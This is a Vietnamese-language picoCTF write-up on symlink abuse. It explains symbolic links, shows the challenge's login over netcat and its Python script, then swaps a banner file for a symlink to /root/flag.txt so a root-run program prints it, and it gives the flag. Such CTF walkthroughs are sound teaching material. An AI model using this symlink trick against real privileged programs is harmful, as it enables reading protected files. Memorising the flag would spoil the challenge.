# Write Up

## Dạng bài

Bài này thuộc dạng Local File Inclusion & Symlink Abuse—một phương pháp tấn công tại chỗ giúp kẻ tấn công lợi dụng cách một chương trình (chạy với đặc quyền cao hơn) mở file do người dùng chỉ định. Dưới đây là tổng quan về dạng này và các kỹ thuật liên quan—từ symlink đến những phương pháp ẩn giấu/xâm nhập khác.

---

## Symlink (Symbolic Link) là gì?

Symlink (hay symbolic link) là một kiểu file đặc biệt trong hệ thống tệp của Linux/Unix, hoạt động như một đường dẫn tham chiếu đến một file hoặc thư mục khác. Cụ thể:
- Không lưu dữ liệu thực: Symlink chứa đường dẫn đến file gốc, không chứa dữ liệu nội dung của file
- Hai loại liên kết:
    - Hard link: Một liên kết cố định vào cùng một inode. Hard link chia sẻ cùng inode, không thể liên kết đến file trên hệ thống tệp khác
    - Symbolic link (symlink): Một file riêng biệt lưu trữ đường dẫn (path) đến file gốc. Symlink có thể trỏ đến file hoặc thư mục, và có thể trỏ qua hệ thống tệp khác

Cách tạo:

```bash
ln -s path/to/file symlink
```

Cách kernel xử lý:
- Khi bạn đọc, mở, hoặc truy vấn metadata của symlink (trừ lệnh trực tiếp lấy thông tin symlink), kernel sẽ theo đường dẫn đó và thực thi thao tác trên file đích.
- Ví dụ: `cat banner` sẽ in nội dung file `/root/flag.txt` nếu `banner` là symlink trỏ tới đó.

Ứng dụng trong tấn công: Kẻ tấn công có thể thay thế file cần đọc (ví dụ `/home/player/banner`) bằng một symlink trỏ đến file nhạy cảm (`/root/flag.txt`). Khi chương trình chạy với quyền cao đọc symlink, nó vô tình mở file gốc và trả về nội dung

---

## Log in

```bash
$ nc  tethys.picoctf.net 54219
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

```bash
$  nc tethys.picoctf.net 56012
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John
player@challenge:~$
```

---

## Script

```python
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```

---

## Kỹ thuật tấn công (Symlink Abuse)

Trong đoạn mã python có đoạn

```python
with open("/home/player/banner", "r") as f:
    print(f.read())
```

`open()` gọi vào hệ thống, kernel sẽ nhận đường dẫn là `/home/player/banner`

Kernel sẽ kiểm tra inode của `banner`:
- Nếu đó là 1 file thường, đọc nội dung file
- Nếu đó là 1 symlink, kernel lấy đường dẫn đích mà symlink lưu trữ

Tạo symlink:

```bash
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt home/player/banner
ln -s /root/flag.txt banner
```

Kiểm tra xem đã có symlink chưa

```bash
player@challenge:~$ ls -l
ls -l
total 4
lrwxrwxrwx 1 player player 14 Jul 22 15:15 banner -> /root/flag.txt
-rw-r--r-- 1 root   root   13 Feb  7  2024 text
```

Khi này sẽ không còn tồn tại file `banner` tại thư mục `home/player` nữa mà thay vào đó là symlink dẫn đến `/root/flag.txt`

Vậy nên khi chạy `nc` thì nó sẽ gọi đến đường dẫn `home/player/banner`, nhưng vì là symlink nên sẽ nhảy đến `/root/flag.txt` và đọc dưới quyền root

---

## Flag

Flag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}
